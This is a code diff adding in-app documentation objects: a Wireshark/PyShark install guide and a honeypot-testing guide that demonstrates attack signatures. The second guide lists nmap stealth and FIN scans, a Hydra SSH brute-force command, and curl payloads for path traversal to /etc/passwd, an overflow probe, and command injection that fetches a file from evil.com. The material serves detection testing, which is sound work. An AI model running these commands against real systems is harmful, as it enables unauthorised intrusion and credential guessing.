@@ -669,6 +669,258 @@ pip install scapy pcapy-ng`
 };
 
 
+// ==========================
+// Wireshark installation
+// ==========================
+export const WiresharkDocumentation: ServiceDocumentation = {
+    id: 'หัวข้อ',
+    name: 'Wireshark and PyShark Installation Guide',
+    description: 'This guide covers the installation of Wireshark, a popular network protocol analyzer, and PyShark, a Python wrapper for Wireshark"s command-line interface, TShark.',
+    sections: [
+        {
+            id: 'สเต็ป',
+            title: '1. Wireshark Installation',
+            content: 'First, update your package lists to ensure you get the latest version of Wireshark. Then, install the application.',
+            codeBlocks: [
+                {
+                    language: 'bash',
+                    code: `sudo apt update
+sudo apt install wireshark -y`
+                }
+            ],
+            subsections: [],
+            images: []
+        },
+        {
+            id: 'สเต็ป',
+            title: '2. Install PyShark in a Virtual Environment',
+            content: 'It"s a good practice to install Python libraries like PyShark within a virtual environment. This keeps your project dependencies isolated and prevents conflicts.',
+            codeBlocks: [],
+            subsections: [
+                {
+                    id: 'สเต็ปย่อย',
+                    title: '',
+                    content: 'First, make sure you have your virtual environment activated (source env/bin/activate). Then, install PyShark using pip.',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `pip install pyshark`
+                        }
+                    ]
+                },
+            ],
+            images: []
+        },
+        {
+            id: 'สเต็ป',
+            title: '3. Wireshark Basic Configuration',
+            content: 'After installation, you need to configure Wireshark to allow non-root users to capture network traffic. This is a crucial step for security and convenience.',
+            codeBlocks: [],
+            subsections: [
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'a) Reconfigure Wireshark Permissions',
+                    content: 'This command will bring up a configuration screen. Select Yes to allow non-root users to capture packets',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `sudo dpkg-reconfigure wireshark-common -y`
+                        }
+                    ]
+                },
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'b) Add Your User to the Wireshark Group',
+                    content: 'Add your current user to the wireshark group. This grants the necessary permissions to capture traffic without requiring sudo. You"ll need to log out and log back in for the changes to take effect.',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `sudo usermod -aG wireshark $USER`
+                        }
+                    ]
+                },
+            ],
+            images: []
+        },
+    ]
+};
+
+
+// ========================
+// Wireshark Attck
+// ========================
+
+export const WiresharkAttckDocumentation: ServiceDocumentation = {
+    id: 'หัวข้อ',
+    name: 'Demonstrating Attack Signatures',
+    description: 'This guide shows how to simulate common attack patterns—scanning, brute-force, and exploitation—using well-known open-source tools. This is for educational and testing purposes only, to help you understand how these attacks work and how they might be detected by a honeypot like OpenCanary. Do not use these commands against systems you do not own.',
+    sections: [
+        {
+            id: 'สเต็ป',
+            title: '1. Scan Signature Demo',
+            content: 'Scanning is the first step an attacker takes to discover hosts and open ports. We will use Nmap, the network mapper, to simulate these scans.',
+            codeBlocks: [
+                {
+                    language: 'bash',
+                    code: 'sudo apt install nmap'
+                }
+            ],
+            subsections: [
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'Host Discovery: This command scans an entire subnet to find active hosts.',
+                    content: '',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `nmap [subnet]`
+                        }
+                    ]
+                },
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'Port Scan: This command checks for specific open ports on a single IP address.',
+                    content: '',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `nmap -p 22,80,443 [ip address]`
+                        }
+                    ]
+                },
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'SYN Stealth Scan: This is a "stealth" scan that is less likely to be logged by firewalls. It is often used by attackers to remain undetected.',
+                    content: '',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `sudo nmap -sS [ip address]`
+                        }
+                    ]
+                },
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'FIN Scan: This scan sends a FIN packet, and if no response is received, the port is considered open. This is another technique to evade detection.',
+                    content: '',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `sudo nmap -sF [ip address]`
+                        }
+                    ]
+                },
+                
+            ],
+            images: []
+        },
+        {
+            id: 'สเต็ป',
+            title: '2. Brute-Force Signature Demo',
+            content: 'Brute-force attacks attempt to guess passwords by systematically trying a large number of common credentials. We will use Hydra, a popular brute-force tool.',
+            codeBlocks: [
+                {
+                    language: 'bash',
+                    code: 'sudo apt install hydra'
+                }
+            ],
+            subsections: [
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'Hydra Command: This command attempts to log into an SSH server. -l specifies the username, and -P points to a file containing a list of passwords.',
+                    content: '',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `hydra -l [username] -P /path/to/passwords.txt ssh://[ip address]`
+                        }
+                    ]
+                },
+            ],
+            images: []
+        },
+        {
+            id: 'สเต็ป',
+            title: '3. Exploit Signature Demo',
+            content: 'These commands simulate common web-based exploitation attempts by sending maliciously crafted requests to a server using Curl.',
+            codeBlocks: [],
+            subsections: [
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'User-Agent Spoofing: This command spoofs the user-agent to mimic a security tool like sqlmap. This can trigger alerts on a honeypot.',
+                    content: '',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `curl -A "sqlmap/1.5" http://[ip address]:[port]/test`
+                        }
+                    ]
+                },
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'Path Traversal: These commands attempt to access sensitive files on the server, like /etc/passwd, by "traversing" directory paths.',
+                    content: '',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `curl http://[ip address]:[port]/etc/passwd`
+                        }
+                    ]
+                },
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'Buffer Overflow: This command sends an abnormally long string of characters (A repeated 200 times) to test if the server is vulnerable to buffer overflow attacks.',
+                    content: '',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `curl http://[ip address]:[port]/$(python3 -c "print('A'*200)")`
+                        }
+                    ]
+                },
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'Command Injection: This command attempts to inject a malicious shell command (wget) into a URL parameter to force the server to download an external file.',
+                    content: '',
+                    codeBlocks: [
+                        {
+                            language: 'bash',
+                            code: `curl "http://[ip address]:[port]/?input=hello%3Bwget%20http://evil.com/malware.sh"`
+                        }
+                    ]
+                },
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'Note on HTTP vs. HTTPS:',
+                    content: 'For HTTPS, change http:// to https:// in the command. For Self-signed certificates, add -k after curl to bypass SSL certificate validation.',
+                    codeBlocks: []
+                },
+            ],
+            images: []
+        },
+        {
+            id: 'สเต็ป',
+            title: '4. Server Side Preparation (HTTP)',
+            content: 'To receive and analyze these HTTP-based requests, you can set up a simple web server using Python"s built-in module.',
+            codeBlocks: [
+                {
+                    language: 'bash',
+                    code: 'python3 -m http.server [port]'
+                }
+            ],
+            subsections: [
+                {
+                    id: 'สเต็ปย่อย',
+                    title: 'This command starts an HTTP server on the specified port, which will log all incoming requests, allowing you to see the attack signatures in real-time.',
+                    content: '',
+                    codeBlocks: []
+                },
+            ],
+            images: []
+        },
+    ]
+};
+
 
 
 export const mockNavigation: NavigationItem[] = [
